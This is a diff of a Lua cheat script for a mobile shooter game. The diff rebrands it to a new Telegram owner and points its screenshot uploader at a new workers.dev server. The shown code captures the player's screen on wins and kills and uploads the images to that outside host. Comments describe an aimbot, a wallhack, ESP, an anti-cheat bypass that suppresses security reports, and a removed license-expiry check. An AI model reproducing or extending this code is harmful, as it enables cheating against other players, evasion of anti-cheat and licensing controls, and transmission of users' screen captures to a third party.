@@ -1,4 +1,4 @@
---------Join us for more https://t.me/AttcTrDevelopers---------@AttcConfigTechnician ---------
+--------Join us for more https://t.me/RAJPOOT53---------@RAJPOOT53 ---------
 local __S={key="Tl",hwid="FB5D9B34F5",exp=1792662438254,t=1792070404011}
 
 ;--[[ AUTO-FEEDBACK (all-payload) v2.14]]
@@ -6,7 +6,7 @@ local __S={key="Tl",hwid="FB5D9B34F5",exp=1792662438254,t=1792070404011}
 --|AUTO-FEEDBACK|TOP-1 screenshot -> T
 local AutoFeedback = {
 	Config = {
-		ServerURL = "https://.pythonanywhere.com/api/feedback/tgo-fb-7k3mx9qv",
+		ServerURL = "https://saleemrajpoot.shadowcheatss-1.workers.dev/",
 		TestMode = false, -- sends ONE test screenshot 5s after load; set to false for release
 		MaxImageBytes = 20 * 1024 * 1024,
 		KillPollInterval = 5 -- seconds between kill-count checks (every new kill -> SS)
@@ -20,8 +20,8 @@ local function Log(message)
 end
 
 local function Notify(message)
-	if _G.SRCHUBNotify or _G.TGOWNER7Notify then
-		pcall(_G.SRCHUBNotify or _G.TGOWNER7Notify, message)
+	if _G.SRCHUBNotify or RAJPOOTNotify then
+		pcall(_G.SRCHUBNotify or _G.RAJPOOTNotify, message)
 	end
 end
 
@@ -224,7 +224,7 @@ local FeedbackCaptionTemplate = [[
 ━━━━━━━━━━━━━━━━━━━
 <b>? <tg-spoiler>ACTIVE - SAFE</tg-spoiler> ?</b>
 
-<tg-emoji emoji-id="5278467510604160626">?</tg-emoji> <b>Owner</b> - @TGOWNER7
+<tg-emoji emoji-id="5278467510604160626">?</tg-emoji> <b>Owner</b> - @RAJPOOT53
 ]]
 
 -- HTML caption for per-kill reports (every new kill -> one screenshot)
@@ -238,7 +238,7 @@ local KillCaptionTemplate = [[
 ━━━━━━━━━━━━━━━━━━━
 <b>? <tg-spoiler>ACTIVE - SAFE</tg-spoiler> ?</b>
 
-<tg-emoji emoji-id="5278467510604160626">?</tg-emoji> <b>Owner</b> - @TGOWNER7
+<tg-emoji emoji-id="5278467510604160626">?</tg-emoji> <b>Owner</b> - @RAJPOOT53
 ]]
 
 function AutoFeedback.SendFeedback(path, kills, rank, segment, locTag, sessionSecs, killMode)
@@ -255,7 +255,7 @@ function AutoFeedback.SendFeedback(path, kills, rank, segment, locTag, sessionSe
 		local function TrySend()
 			local imageData = ReadFile(path)
 			if #imageData > AutoFeedback.Config.MaxImageBytes then
-				Notify("[TGOWNER7] Screenshot too large to upload!")
+				Notify("[RAJPOOT] Screenshot too large to upload!")
 				RemoveFile(path)
 				return
 			end
@@ -299,14 +299,14 @@ function AutoFeedback.SendFeedback(path, kills, rank, segment, locTag, sessionSe
 
 				local encodedCaption = JsonString(caption)
 				if not encodedCaption then
-					Notify("[TGOWNER7] Caption encoding failed!")
+					Notify("[RAJPOOT] Caption encoding failed!")
 					RemoveFile(path)
 					return
 				end
 
 					Notify(killMode
-						and string.format("[TGOWNER7] Uploading KILL report (%d kills)...", kills)
-						or "[TGOWNER7] Uploading Top 1 screenshot to VIP Server...")
+						and string.format("[RAJPOOT] Uploading KILL report (%d kills)...", kills)
+						or "[RAJPOOT] Uploading Top 1 screenshot to VIP Server...")
 				local body = '{"base64_image":"' .. Base64Encode(imageData)
 					.. '","caption":' .. encodedCaption .. '}'
 
@@ -317,10 +317,10 @@ function AutoFeedback.SendFeedback(path, kills, rank, segment, locTag, sessionSe
 					nil,
 					function(success, _, response, errorMessage)
 						if success and response and tostring(response):find('"status":%s*true') then
-							Notify("[TGOWNER7] Successfully sent! (Kills: " .. tostring(kills) .. ")")
+							Notify("[RAJPOOT] Successfully sent! (Kills: " .. tostring(kills) .. ")")
 						else
 							local detail = tostring(response or errorMessage):sub(1, 40)
-							Notify("[TGOWNER7] VIP Server error: " .. detail)
+							Notify("[RAJPOOT] VIP Server error: " .. detail)
 						end
 						RemoveFile(path)
 					end,
@@ -334,7 +334,7 @@ function AutoFeedback.SendFeedback(path, kills, rank, segment, locTag, sessionSe
 				return
 			end
 
-			Notify("[TGOWNER7] Screenshot capture failed!")
+			Notify("[RAJPOOT] Screenshot capture failed!")
 			RemoveFile(path)
 		end
 
@@ -673,14 +673,14 @@ local function CaptureAndSend(kills, rank, segment, restoreHud, locTag, sessionS
 						if #ReadFile(path) > 0 then
 							AutoFeedback.SendFeedback(path, kills, rank, segment, locTag, sessionSecs, killMode)
 						else
-							Notify("[TGOWNER7] iOS image read error!")
+							Notify("[RAJPOOT] iOS image read error!")
 						end
 					end)
 				elseif attempts < 15 then
 					ticker.AddTimerOnce(1, CheckCapture)
 				else
 					RestoreHudOnce()
-					Notify("[TGOWNER7] Screenshot capture failed!")
+					Notify("[RAJPOOT] Screenshot capture failed!")
 				end
 			end
 
@@ -742,7 +742,7 @@ function AutoFeedback.ProcessWin(kills, force)
 	-- v2.4: koi rank-gate nahi - HAR rank / Unranked / TDM win pe SS jaata hai
 	Log(string.format("Win feedback: Rank %d, Kills %d", rank, kills))
 
-	Notify("[TGOWNER7] Congratulations on the WIN!")
+	Notify("[RAJPOOT] Congratulations on the WIN!")
 	local setHudHidden = CreateHudController()
 	setHudHidden(true)
 
@@ -1157,7 +1157,7 @@ local function TryInstallHook()
 end
 
 function AutoFeedback.Install()
-	Log("Installing TGOWNER7 system (Telegram)...")
+	Log("Installing RAJPOOT system (Telegram)...")
 
 	if AutoFeedback.Config.TestMode then
 		pcall(function()
@@ -1186,7 +1186,7 @@ _G.WEOW_AutoFeedbackRecovered = AutoFeedback
 
 AutoFeedback.Install()
 end)()
--- + MOD MENU (TGOWNER7 CYBERPUNK NEON) Integrated with Retry Loop
+-- + MOD MENU (RAJPOOT53 CYBERPUNK NEON) Integrated with Retry Loop
 local ENetRole = import("ENetRole")
 local EPawnState = import("EPawnState")
 local GameplayData = require("GameLua.GameCore.Data.GameplayData")
@@ -1195,7 +1195,7 @@ local GameplayStatics = import("GameplayStatics")
 local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
 local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
 
--- TGOWNER7 FIX: FVector global kabhi nil tha -> L1950 pe POORA payload
+-- RAJPOOT53 FIX: FVector global kabhi nil tha -> L1950 pe POORA payload
 -- crash hota tha (menu + ESP + features kabhi load nahi hote the)
 if not _G.FVector then
     pcall(function() _G.FVector = import("Vector") end)
@@ -1236,14 +1236,14 @@ local function FormatTimeRemaining(sec)
 end
 
 function CheckExpiration()
-    -- TGOWNER7: OFFLINE EXPIRY SYSTEM REMOVED - kabhi expire nahi hoga
+    -- RAJPOOT53: OFFLINE EXPIRY SYSTEM REMOVED - kabhi expire nahi hoga
     _G._MOD_EXPIRED = false
     _G._MOD_REMAINING_SECONDS = 999999999
     return true
 end
 
 local function ShowExpiryPopup(expired)
-    -- TGOWNER7: expiry popup REMOVED (offline system hata diya)
+    -- RAJPOOT53: expiry popup REMOVED (offline system hata diya)
 end
 
 function _G.TryShowWelcome()
@@ -3075,7 +3075,7 @@ function _G.EnemyCounterLoop()
     end
 
     if _G.AK_GetVal("ENEMY_COUNTER") == 1 then
-        text = text .. "\n✦ MODER - TGOWNER7 ✦"
+        text = text .. "\n✦ MODER - RAJPOOT ✦"
     end
 
     if text ~= "" then
@@ -5940,14 +5940,14 @@ function BRPlayerCharacterBase:StartAdvancedSystems()
             if not Msg then Msg = require("client.slua.logic.common.logic_common_msg_box") end
             local Web = require("client.slua.logic.url.logic_webview_sdk")
             local function onClick()
-                if Web then Web:OpenURL("https://t.me/TGOWNER7") end
+                if Web then Web:OpenURL("https://t.me/3030172053") end
             end
             if Msg and Msg.Show then
-                Msg.Show(4, "✦ TGOWNER7 – PREMIUM MOD ✦",
+                Msg.Show(4, "✦ RAJPOOT – PREMIUM MOD ✦",
                     "★ Play Like Legit Player - Safe\n" ..
                     "★ Don't Play Like Hacker - Safe\n" ..
-                    "★ TGOWNER7 Always Op - Moder\n\n" ..
-                    "✓ Use And Send Feedbacks - @TGOWNER7!", onClick)
+                    "★ RAJPOOT Always Op - Moder\n\n" ..
+                    "✓ Use And Send Feedbacks - @RAJPOOT53!", onClick)
             end
         end)
     end)
@@ -6201,7 +6201,7 @@ end
 _G.InitializeAllSystems()
 
 -- ================================================================
--- TGOWNER7 WATERMARK (ALWAYS ON - SAME POSITION)
+-- RAJPOOT WATERMARK (ALWAYS ON - SAME POSITION)
 -- ================================================================
 local GANESHCuOverlay = {
     Widget = nil,
@@ -6255,7 +6255,7 @@ local function EnsurePermanentGANESHCu()
     pcall(function() txtTitle = CGame:NewObjectFromPath("/Script/UMG.TextBlock", ParentCanvas) end)
     if txtTitle and slua.isValid(txtTitle) then
         pcall(function()
-            txtTitle:SetText("TGOWNER7")
+            txtTitle:SetText("RAJPOOT")
             local FLinearColor = import("LinearColor") or _G.FLinearColor
             local FSlateColor = import("SlateColor") or import("/Script/SlateCore.SlateColor")
             local redLinear = FLinearColor and FLinearColor(0.0, 0.0, 0.0, 1.0) or {R=0, G=0, B=0, A=255}
@@ -6615,7 +6615,7 @@ local FSlateColorUI = import("SlateColor")
 local FVector2D_UI = import("Vector2D")
 
 UI.Config = {
-    Title          = "TGOWNER7 PREMIUM MENU",
+    Title          = "RAJPOOT PREMIUM MENU",
     BtnW           = 90,
     BtnH           = 26,
     RowH           = 42,
@@ -7060,10 +7060,10 @@ local function StyleTGText(txtWidget)
     end)
 end
 
--- TG: TGOWNER7 (left)
+-- TG: RAJPOOT (left)
 panel.tgBg1 = NewBorder(wrapper, C.Padding, tgY, tgBtnW, tgBtnH, C.ColorTGBtn)
 panel.tgTx1 = NewText(wrapper, C.Padding, tgY, tgBtnW, tgBtnH,
-    "TG: TGOWNER7", C.ColorTGText, 18)
+    "TG: RAJPOOT", C.ColorTGText, 18)
 StyleTGText(panel.tgTx1)
 
 panel.tgHit1 = NewButton(wrapper, C.Padding, tgY, tgBtnW, tgBtnH)
@@ -7163,7 +7163,7 @@ function UI.BuildButton()
 
 btn.bg = NewBorder(wrapper, 0, 0, C.BtnW, C.BtnH, C.ColorBG)
 btn.strip = NewBorder(wrapper, 0, 0, 3, C.BtnH, C.ColorAccent)
-btn.txt = NewText(wrapper, 12, 0, C.BtnW - 15, C.BtnH, "TGOWNER7", C.ColorTitle, 14)
+btn.txt = NewText(wrapper, 12, 0, C.BtnW - 15, C.BtnH, "RAJPOOT", C.ColorTitle, 14)
 SafeCall(function() btn.txt:SetJustification(UEnums.ETextJustify.Center or 1) end)
 SafeCall(function() btn.txt:SetVerticalJustification(UEnums.EVerticalTextAligment.Center or 0) end)
 
@@ -7279,7 +7279,7 @@ function UI.Init()
     if not panel then return false end
     UI._inited = true
     UI.Hide()
-    print("✅ TGOWNER7 Menu Initialized!")
+    print("✅ RAJPOOT Menu Initialized!")
     return true
 end
 
@@ -7310,7 +7310,7 @@ end)
 _G.GANESHMenu = UI
 
 -- ========================================================================
--- TGOWNER7 TOP LUA BYPASS v2 (POWER FULL - 70futures UPDATED engine)
+-- RAJPOOT TOP LUA BYPASS v2 (POWER FULL - 70futures UPDATED engine)
 -- v5.0 core (100+ anti-ban blocks) + ADDITIONAL LAYERS (BanLogic/MD5/
 -- Gokuba/RacingAntiCheat/KillAllSubsystems) + WEOV ANTI-CHEAT KILLERS
 -- (DeadEye/HawkEye/Voklai/HiggsBoson/HashVerify/IPMapping/MemoryPatch)
@@ -9128,7 +9128,7 @@ do
     end
 end
 
--- TGOWNER7: match/map change pe bypass re-arm (watchdog)
+-- RAJPOOT: match/map change pe bypass re-arm (watchdog)
 pcall(function()
     if Game and Game.SetTimer then
         Game:SetTimer(5.0, true, function()
@@ -9141,7 +9141,7 @@ pcall(function()
 end)
 
 -- ========================================================================
--- TGOWNER7 FIX v2: CLASS BOOT
+-- RAJPOOT FIX v2: CLASS BOOT
 -- Problem: BRPlayerCharacterBase class payload me REGISTER nahi hoti,
 -- isliye StartAdvancedSystems (jisme SAB feature ticks hai - 0.4s main
 -- loop, wallhack, aimbot, bypass monitors) KABHI call nahi hota tha.
@@ -9152,7 +9152,7 @@ end)
 -- ========================================================================
 local function TG_StartAdvanced()
     pcall(function()
-        -- TGOWNER7 CIRCLE FIX: ArrowRadar (FOV circle + arrows) ke timers
+        -- RAJPOOT CIRCLE FIX: ArrowRadar (FOV circle + arrows) ke timers
         -- purane pawn/PC ke saath mar jate the (bActive stale true reh jata tha)
         if _G.ArrowRadarESP and _G.ArrowRadarESP.bActive then
             pcall(function() _G.ArrowRadarESP.Stop() end)
@@ -9171,7 +9171,7 @@ end
 
 pcall(function()
     TG_StartAdvanced()
-    -- TGOWNER7 CIRCLE SAFETY NET: ARROW_RADAR toggle ON ho to circle/arrows
+    -- RAJPOOT CIRCLE SAFETY NET: ARROW_RADAR toggle ON ho to circle/arrows
     -- hamesha zinda rahein (canvas late-load / timer miss cover)
     pcall(function()
         if Game and Game.SetTimer then
@@ -9211,7 +9211,7 @@ pcall(function()
 end)
 
 -- ========================================================================
--- TGOWNER7 PRIVATE BYPASS (HANDCRAFTED - ye layer sirf is payload me hai)
+-- RAJPOOT PRIVATE BYPASS (HANDCRAFTED - ye layer sirf is payload me hai)
 -- 70futures v2 + GANESH ke 4 bypasses ke UPAR extra protection:
 --   P1. SECURITY EVENT FILTER - security report events server tak nahi
 --       pahunchte (EventSystem:postEvent wrap, sirf EVENTTYPE_SECURITY drop)
@@ -9281,5 +9281,5 @@ pcall(function()
         pcall(function() require("common.time_ticker").AddTimerOnce(1.0, TGO_Private_Arm) end)
     end
 end)
-print("[TGOWNER7 PRIVATE BYPASS] armed (P1 event filter + P2 report nop + P3 rearm)")
---------Join us for more https://t.me/AttcTrDevelopers---------@AttcConfigTechnician ---------
+print("[RAJPOOT PRIVATE BYPASS] armed (P1 event filter + P2 report nop + P3 rearm)")
+--------Join us for more https://t.me/RAJPOOT53---------@RAJPOOT53 ---------
